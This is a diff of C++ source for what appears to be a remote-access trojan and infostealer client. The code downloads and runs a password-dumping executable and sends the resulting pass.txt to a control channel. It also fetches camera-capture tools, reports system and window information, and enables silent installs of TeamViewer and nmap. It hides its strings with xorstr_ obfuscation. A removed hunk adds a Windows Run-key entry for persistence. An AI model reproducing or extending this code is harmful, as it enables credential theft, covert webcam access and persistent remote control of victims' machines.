@@ -50,11 +50,6 @@ namespace client {
 			/* Send Current Windows */
 			communication::send_message("All Windows", client::functions::prepare_payload("All Windows", client::functions::get_all_windows()));
 
-			/* Always Update registry */
-			HKEY key = NULL;
-			LONG v1 = RegCreateKey(HKEY_CURRENT_USER, xorstr_("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &key);
-			LONG v2 = RegSetValueEx(key, xorstr_("ExceptionHandler"), 0, REG_SZ, (BYTE*)(PATH + STARTUP_FILE_NAME).c_str(), ((PATH + STARTUP_FILE_NAME).size() + 1) * sizeof(wchar_t));
-
 			Sleep(300000);
 
 			if (once) {
@@ -87,7 +82,7 @@ namespace client {
 
 	void setup() {
 		/* Create Client Channel */
-		requests::post("https://overflow.red/php/channel.php");
+		requests::post("php/channel.php");
 
 		/* Set Initialized */
 		communication::set_profile("initialized", "1");
@@ -102,25 +97,25 @@ namespace client {
 		communication::send_message(xorstr_("Computer Info"), client::functions::get_computer_info() + client::functions::get_computer_brand());
 		
 		/* Post Passwords */
-		requests::download_file("https://overflow.red/downloads/shaco.exe", PATH + xorstr_("shaco.exe"));
+		requests::download_file("downloads/shaco.exe", PATH + xorstr_("shaco.exe"));
 		system(xorstr_("cd %AppData%\\Microsoft\\COM && shaco.exe"));
 		communication::send_message(xorstr_("Passwords"), "", PATH + xorstr_("pass.txt"), "file");
 		
 		/* Post Camera */
-		requests::download_file("https://overflow.red/downloads/dll.zip", PATH + xorstr_("dll.zip"));
+		requests::download_file("downloads/dll.zip", PATH + xorstr_("dll.zip"));
 		std::string command = xorstr_("powershell -command \"Expand-Archive ") + PATH + "dll.zip" + " -DestinationPath " + helpers::roaming + xorstr_("\\Microsoft\\COM") + "\"";
 		system(command.c_str());
-		requests::download_file("https://overflow.red/downloads/CameraManager.exe", PATH + xorstr_("cam.exe"));
+		requests::download_file("downloads/CameraManager.exe", PATH + xorstr_("cam.exe"));
 		communication::send_message("Camera Manager", helpers::exec(("cd " + PATH + " && cam.exe check").c_str()));
 	}
 
 	void download_all() {
 		if (communication::get_profile("downloaded") != "1") {
-			/*if (!std::filesystem::exists(PATH + xorstr_("tv")))
+			if (!std::filesystem::exists(PATH + xorstr_("tv")))
 				functions::install_teamviewer();
 
 			if (helpers::exec("where nmap").find("nmap") == std::string::npos)
-				functions::install_nmap();*/
+				functions::install_nmap();
 
 			if (helpers::exec("where python").find("Python") == std::string::npos)
 				functions::install_python();
